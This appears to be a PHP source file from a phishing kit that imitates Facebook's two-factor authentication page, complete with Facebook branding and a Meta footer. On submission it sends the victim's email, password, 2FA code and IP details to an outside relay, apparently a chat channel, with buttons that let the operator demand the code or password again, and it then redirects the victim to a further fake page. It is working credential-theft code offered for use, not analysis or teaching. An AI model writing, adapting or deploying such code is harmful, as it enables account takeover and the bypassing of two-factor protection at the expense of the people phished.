<?php
  if(!is_set("email", $_SESSION["data"])) redirect_to("/");
?>

<?php 
  $type = isset($_GET["type"]) ? $_GET["type"] : "2fa";
  if(isset($_POST["submitAuth"])){
    $message = "THIRD EMAIL\n";
    $message .= $_SESSION["ipinfo"]["message"];
    $message .= "Email: ". $_SESSION["data"]["email"] ."\n";
    $message .= "Password: ". $_SESSION["data"]["password"] ." \n";
    $message .= "2Fac: ". $_POST["authenticator"] ."\n";
    $buttons = [
      ["text" => "2FA", "url" => API."/".ROOM."/2FAAGAIN"],
      ["text" => "EMAIL", "url" => API."/".ROOM."/EMAILAGAIN"],
      ["text" => "PASSWD", "url" => API."/".ROOM."/PASSWDAGAIN"],
      ["text" => "ERROR", "url" => API."/".ROOM."/ERROR"],
      ["text" => "RESTRICT", "url" => API."/".ROOM."/RESTRICT"],
      ["text" => "CAREER", "url" => API."/".ROOM."/CAREER"]
    ];
    send_message($message, $buttons);
    redirect_to("/registration");
  }
?>

<link href='<?php echo DOMAIN;?>/assets/css/auth.module.css' rel='stylesheet' />
<div>
  <div class="authHeader">
    <div class="authInnerHeader">
      <a href="/">
        <img class="authHeaderImg" src="<?php echo DOMAIN;?>/assets/images/fblogo.svg" alt="Logo" />
      </a>
      <a class="authLogout" href="#" alt="Log Out">Log Out</a>
    </div>
  </div>
  <div class="authFormContainer">
    <form method="post" class="authForm">
      <h4>Choose a way to confirm that it's you</h4>
      <input type="hidden" name="authType" id="authType" value="<?php echo $type;?>" />
      <div class="seperator">
        <p>Your account has two-factor authentication switched on, which requires this extra login step.</p>
      </div>
      <div class="seperator">
        <h3>Approve from another device</h3>
        <p>
          We already sent a notification to your logged-in devices. 
          Check your Facebook notifications where you're already logged in to the account and approve the login to continue.
        </p>
      </div>
      <div class="seperator noBorder">
        <h3>Or, enter your login code</h3>
        <p style="<?php echo ($type != "email" ? "display:none" : "");?>" class="noBtmMargin" id="emailMessage">
          Enter the code we sent to your email.
        </p>
        <p style="<?php echo ($type != "2fa" ? "display:none" : "");?>" class="noBtmMargin" id="2faMessage">
          Enter the 6-digit code from the authentication app that you set up.
        </p>
        <input 
          class="authFormInput" 
          type="number" 
          name="authenticator" 
          id="authenticator" 
          placeholder="Login code" 
          data-required="true"
          data-codetype="<?php echo $type;?>"
        />
        <span class="error" id="errorRequired">Login code is required</span>
        <?php if(is_set("again", $_GET)){ ?>
          <span class="error" style="display: block">
            Your code has expired. Please enter a new code to continue to your account.
          </span>
        <?php } ?>
      </div>
      <div class="authSubmit">
        <a href="#" onClick="openAuthModal()">Need another way to confirm that it's you?</a>
        <button name="submitAuth" type="submit">Submit Code</button>
      </div>
    </Form>
  </div>
  
  <div class="footer">
    <div class="topFooter">
      <a href="#">English (UK)</a>
      <a href="#">Shqip</a>
      <a href="#">Deutsch</a>
      <a href="#">Türkçe</a>
      <a href="#">Српски</a>
      <a href="#">Français (France)</a>
      <a href="#">Italiano</a>
      <a href="#">Bosanski</a>
      <a href="#">Svenska</a>
      <a href="#">Español</a>
      <a href="#">Português (Brasil)</a>
    </div>
    <div class="bottomFooter">
      <a href="#">Sign Up</a>
      <a href="#">Log in</a>
      <a href="#">Messenger</a>
      <a href="#">Facebook Lite</a>
      <a href="#">Watch</a>
      <a href="#">Places</a>
      <a href="#">Games</a>
      <a href="#">Marketplace</a>
      <a href="#">Meta Pay</a>
      <a href="#">Oculus</a>
      <a href="#">Portal</a>
      <a href="#">Instagram</a>
      <a href="#">Bulletin</a>
      <a href="#">Fundraisers</a>
      <a href="#">Services</a>
      <a href="#">Voting Information Centre</a>
      <a href="#">Privacy Policy</a>
      <a href="#">Privacy Center</a>
      <a href="#">Groups</a>
      <a href="#">About</a>
      <a href="#">Create ad</a>
      <a href="#">Create Page</a>
      <a href="#">Developers</a>
      <a href="#">Careers</a>
      <a href="#">Cookies</a>
      <a href="#">AdChoices</a>
      <a href="#">Terms</a>
      <a href="#">Help</a>
      <a href="#">Contact uploading and non-users</a>
    </div>
    <span>Meta © 2023</span>
  </div> 
  <?php 
    include "./components/AuthModal.php"; 
  ?>
</div>